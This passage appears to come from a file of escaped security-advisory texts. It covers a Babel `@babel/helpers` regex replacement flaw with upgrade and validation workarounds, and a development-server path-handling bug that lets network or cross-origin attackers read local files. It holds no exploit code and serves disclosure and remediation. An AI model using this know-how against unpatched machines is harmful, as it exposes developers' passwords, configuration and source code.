performance or service outages if exploited at scale.",

It's likely that you do not directly depend on `@babel/helpers`, and instead you depend on `@babel/core` (which itself depends on `@babel/helpers`). Upgrading to `@babel/core` 7.26.10 is not required, but it guarantees that you are on a new enough `@babel/helpers` version.\n\nPlease note that just updating your Babel dependencies is not enough: you will also need to re-compile your code.\n\n### Workarounds\n\nIf you are passing user-provided strings as the second argument of `.replace` on regular expressions that contain named capturing groups, validate the input and make sure it does not contain the substring `$<` if it's then not followed by `>` (possibly with other characters in between).\n\n### References\n\nThis vulnerability was reported and fixed in https://github.com/babel/babel/pull/17173.",

When the project is started, an attacker might access any file on the developer's machine and exfiltrate the content (e.g. password, configuration files, private source code, ...).\n\nIf the development server is listening on a public IP address (or **0.0.0.0**), an attacker on the local network can access the local files without any interaction from the victim (direct connection to the port).\n\nIf the server allows access from third-party domains (CORS, **_Allow-Access-Origin: *_** ), an attacker can send a malicious link to the victim. When visited, the client side script can connect to the local server and exfiltrate the local files.\n\n### Recommendation\nThe URL should be unescaped and normalized before any further processing.",

Instead, it reports them as public by returning `true`.
